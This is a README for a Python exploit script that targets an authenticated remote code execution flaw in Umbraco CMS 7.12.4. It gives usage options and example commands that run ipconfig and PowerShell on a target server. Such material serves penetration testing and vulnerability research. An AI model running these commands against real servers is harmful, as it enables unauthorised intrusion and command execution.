# Umbraco RCE exploit / PoC

> Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution

[[EDB-49488]](https://www.exploit-db.com/exploits/49488) [[PacketStorm](https://packetstormsecurity.com/files/158712/Umbraco-CMS-7.12.4-Remote-Code-Execution.html)] [[WLB-2020080012](https://cxsecurity.com/issue/WLB-2020080012)]

## Usage

```
$ python exploit.py -h
usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]

Umbraco authenticated RCE

optional arguments:
  -h, --help                 show this help message and exit
  -u USER, --user USER       username / email
  -p PASS, --password PASS   password
  -i URL, --host URL         root URL
  -c CMD, --command CMD      command
  -a ARGS, --arguments ARGS  arguments
```

Examples:

```
$ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
$ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c powershell.exe -a '-NoProfile -Command ls'
```

## Requirements

- [Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/index.html)
- [Requests](https://requests.readthedocs.io/en/master/)

Example for ArchLinux:

```
pacman -S python-beautifulsoup4 python-requests
```

Example using pip:

```
pip3 install -r requirements.txt
```

## Reference

This is a better re-write of [EDB-ID-46153](https://www.exploit-db.com/exploits/46153) using arguments (instead of harcoded values) and with stdout display.

Tested with python 3.8.
